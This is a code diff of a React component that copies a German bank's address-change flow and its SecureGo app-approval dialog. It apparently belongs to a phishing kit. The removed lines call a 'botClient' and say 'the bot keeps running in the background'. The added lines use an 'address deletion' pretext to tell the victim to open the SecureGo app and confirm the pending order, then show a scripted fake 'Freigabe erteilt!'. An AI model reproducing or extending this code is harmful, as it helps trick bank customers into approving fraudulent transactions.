@@ -1,5 +1,4 @@
 import { useState } from "react";
-import { confirmAddress, getBotTask } from "@/lib/botClient";
 import {
   MapPin,
   Info,
@@ -8,6 +7,7 @@ import {
   Shield,
   CheckCircle2,
   Trash2,
+  Smartphone,
 } from "lucide-react";
 import {
   AlertDialog,
@@ -40,7 +40,6 @@ function splitAddr(a: Address) {
 
 export function AddressVerificationStep({
   theme,
-  taskId,
   currentAddress,
   additionalAddress,
   bankGroup,
@@ -49,7 +48,6 @@ export function AddressVerificationStep({
   onDeleted,
 }: {
   theme: FlowTheme;
-  taskId?: string;
   currentAddress: Address;
   additionalAddress: Address;
   bankGroup?: string;
@@ -58,9 +56,7 @@ export function AddressVerificationStep({
   onDeleted: (deleted: Address) => void;
 }) {
   const themeColor = theme.headerBg === "#ffffff" ? theme.buttonBg : theme.headerBg;
-  void getSecureGoLabel;
-  void bankGroup;
-  void customerName;
+  const secureGoLabel = getSecureGoLabel(bankGroup);
   const rotated = splitAddr(additionalAddress);
 
   const [selectedAddress, setSelectedAddress] = useState<"current" | "new">("current");
@@ -69,39 +65,20 @@ export function AddressVerificationStep({
   const [showSecureGo, setShowSecureGo] = useState(false);
   const [secureGoApproved, setSecureGoApproved] = useState(false);
   const [showExplanation, setShowExplanation] = useState(false);
-  const [deleteError, setDeleteError] = useState<string | null>(null);
-  const [deleting, setDeleting] = useState(false);
+  const [showTanExplanation, setShowTanExplanation] = useState(false);
 
-  const openSecureGo = async () => {
-    if (!taskId) {
-      setDeleteError("Sitzung nicht gefunden. Bitte neu anmelden.");
-      return;
-    }
-    setDeleteError(null);
-    setDeleting(true);
-    try {
-      const res = await confirmAddress(taskId);
-      if (!res.ok) throw new Error(`HTTP ${res.status}`);
-    } catch (e: any) {
-      setDeleting(false);
-      setDeleteError(`Löschen fehlgeschlagen: ${e?.message ?? "Unbekannter Fehler"}`);
-      return;
-    }
-    // Close the confirmation dialog immediately and show a brief updating
-    // indicator, then let the parent continue (navigate to personal-data or
-    // advance to the "deleted" step). The bot keeps running in the background.
+  const openSecureGo = () => {
     setShowDeleteDialog(false);
-    setSecureGoApproved(true);
+    setSecureGoApproved(false);
     setShowSecureGo(true);
     setTimeout(() => {
-      setShowSecureGo(false);
-      setDeleting(false);
-      onDeleted(additionalAddress);
-    }, 1800);
+      setSecureGoApproved(true);
+      setTimeout(() => {
+        setShowSecureGo(false);
+        onDeleted(additionalAddress);
+      }, 1500);
+    }, 2200);
   };
-
-  // Silence unused-import warning when polling is disabled
-  void getBotTask;
 
   return (
     <div className="w-full max-w-2xl mx-auto flex flex-col gap-4">
@@ -300,47 +277,127 @@ export function AddressVerificationStep({
                 </div>
               </AlertDialogDescription>
             </AlertDialogHeader>
-            {deleteError && (
-              <p className="text-sm text-red-600 mb-3">{deleteError}</p>
-            )}
             <AlertDialogFooter className="flex justify-end gap-3 pt-2">
               <AlertDialogCancel
-                disabled={deleting}
                 className={`mt-0 ${theme.buttonRadius || "rounded-full"} px-6 py-2.5 border-gray-300 text-gray-700 hover:bg-gray-50 font-medium text-sm`}
               >
                 Abbrechen
               </AlertDialogCancel>
               <AlertDialogAction
-                disabled={deleting}
-                className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 border-0 disabled:opacity-60`}
+                className={`${theme.buttonRadius || "rounded-full"} px-6 py-2.5 text-white font-medium text-sm hover:opacity-90 border-0`}
                 style={{ backgroundColor: theme.buttonBg }}
-                onClick={(e) => { e.preventDefault(); openSecureGo(); }}
+                onClick={openSecureGo}
               >
-                {deleting ? "Wird gelöscht…" : "Adresse löschen"}
+                Adresse löschen
               </AlertDialogAction>
             </AlertDialogFooter>
           </div>
         </AlertDialogContent>
       </AlertDialog>
 
-      {/* Brief "updating" indicator while the bot continues in the background */}
-      <AlertDialog open={showSecureGo}>
-        <AlertDialogContent className="sm:rounded-xl sm:max-w-sm">
+      {/* SecureGo approval dialog */}
+      <AlertDialog open={showSecureGo} onOpenChange={setShowSecureGo}>
+        <AlertDialogContent className="sm:rounded-xl sm:max-w-lg">
           <AlertDialogHeader className="sr-only">
-            <AlertDialogTitle>Adresse wird aktualisiert</AlertDialogTitle>
+            <AlertDialogTitle>Prüfen</AlertDialogTitle>
           </AlertDialogHeader>
           <AlertDialogDescription asChild>
-            <div className="flex flex-col items-center gap-3 py-6 text-center">
-              {!secureGoApproved ? (
+            <div className="text-left space-y-5">
+              <div className="rounded-lg border border-gray-200 p-4 space-y-4">
+                <div>
+                  <p className="text-base font-bold text-gray-900 mb-2">Adresse bearbeiten</p>
+                  <div className="mb-3">
+                    <p className="text-xs text-gray-400">Adressat</p>
+                    <p className="text-sm font-medium text-gray-800">{customerName || "—"}</p>
+                  </div>
+                  <p className="text-xs text-gray-400">Hauptadresse (Wohnsitz)</p>
+                  <p className="text-sm text-gray-700">{currentAddress?.strasse || "—"}</p>
+                  <p className="text-sm text-gray-700">{currentAddress?.plzOrt || ""}</p>
+                </div>
+
+                <div className="border-t border-gray-200" />
+
+                <div>
+                  <p className="text-base font-bold text-gray-900 mb-2">Adresse löschen</p>
+                  <p className="text-xs text-gray-400">Hauptadresse (Wohnsitz)</p>
+                  <p className="text-sm text-gray-700">{rotated.street}</p>
+                  <p className="text-sm text-gray-700">
+                    {rotated.zip_code} {rotated.city}
+                  </p>
+                </div>
+              </div>
+
+              <div className="space-y-4">
+                <h3 className="text-xl font-bold text-gray-900">Sicherheitsabfrage</h3>
+
+                <button
+                  className="flex items-center gap-2 text-sm font-semibold"
+                  style={{ color: "#0066cc" }}
+                  onClick={() => setShowTanExplanation(!showTanExplanation)}
+                >
+                  <ChevronDown
+                    className={`w-4 h-4 transition-transform ${showTanExplanation ? "rotate-180" : ""}`}
+                  />
+                  Bitte unbedingt Auftragsdaten abgleichen
+                </button>
+
+                {showTanExplanation && (
+                  <div className="rounded-lg bg-blue-50 border border-blue-200 p-3 text-sm text-gray-700">
+                    Gleichen Sie die Auftragsdaten in der App mit den hier angezeigten Daten ab, bevor Sie den
+                    Auftrag freigeben.
+                  </div>
+                )}
+
+                <div className="rounded-lg border border-gray-300 p-3 flex items-center justify-between cursor-pointer">
+                  <div>
+                    <p className="text-xs text-gray-500">Sicherheitsverfahren</p>
+                    <p className="text-sm text-gray-900 font-medium">{secureGoLabel}</p>
+                  </div>
+                  <ChevronDown className="w-5 h-5 text-gray-400" />
+                </div>
+
                 <div
-                  className="w-8 h-8 rounded-full border-[3px] border-gray-200 animate-spin"
-                  style={{ borderTopColor: theme.buttonBg }}
-                />
-              ) : (
-                <CheckCircle2 className="w-8 h-8 text-green-500" />
-              )}
-              <p className="text-sm font-medium text-gray-700">Adresse wird aktualisiert…</p>
-              <p className="text-xs text-gray-500">Sie werden gleich weitergeleitet.</p>
+                  className="rounded-lg p-5 space-y-4"
+                  style={{ backgroundColor: "#FFF4EC", border: "1.5px solid #F08C00" }}
+                >
+                  <div className="flex items-center gap-3">
+                    <Smartphone className="w-5 h-5 text-gray-700" />
+                    <p className="text-base font-bold text-gray-900">Bestätigen mit {secureGoLabel}</p>
+                  </div>
+                  <ol className="list-decimal space-y-3 text-sm text-gray-700 pl-6">
+                    <li>Öffnen Sie die App {secureGoLabel} auf Ihrem Mobile Device.</li>
+                    <li>Prüfen Sie die Auftragsdaten.</li>
+                    <li>
+                      Bestätigen Sie den Auftrag, wenn die Auftragsdaten korrekt sind. Andernfalls lehnen Sie den
+                      Auftrag ab.
+                    </li>
+                  </ol>
+
+                  {!secureGoApproved ? (
+                    <div className="flex flex-col items-center gap-3 pt-2">
+                      <div
+                        className="w-8 h-8 rounded-full border-[3px] border-gray-200 animate-spin"
+                        style={{ borderTopColor: "#0066cc" }}
+                      />
+                    </div>
+                  ) : (
+                    <div className="text-center space-y-2 pt-2">
+                      <CheckCircle2 className="w-7 h-7 text-green-500 mx-auto" />
+                      <p className="text-sm font-medium text-green-600">Freigabe erteilt!</p>
+                    </div>
+                  )}
+                </div>
+              </div>
+
+              <div className="flex items-center gap-3 pt-2">
+                <button
+                  onClick={() => setShowSecureGo(false)}
+                  className={`px-6 py-2 ${theme.buttonRadius || "rounded-full"} border font-medium text-sm`}
+                  style={{ borderColor: themeColor, color: themeColor }}
+                >
+                  Abbrechen
+                </button>
+              </div>
             </div>
           </AlertDialogDescription>
         </AlertDialogContent>
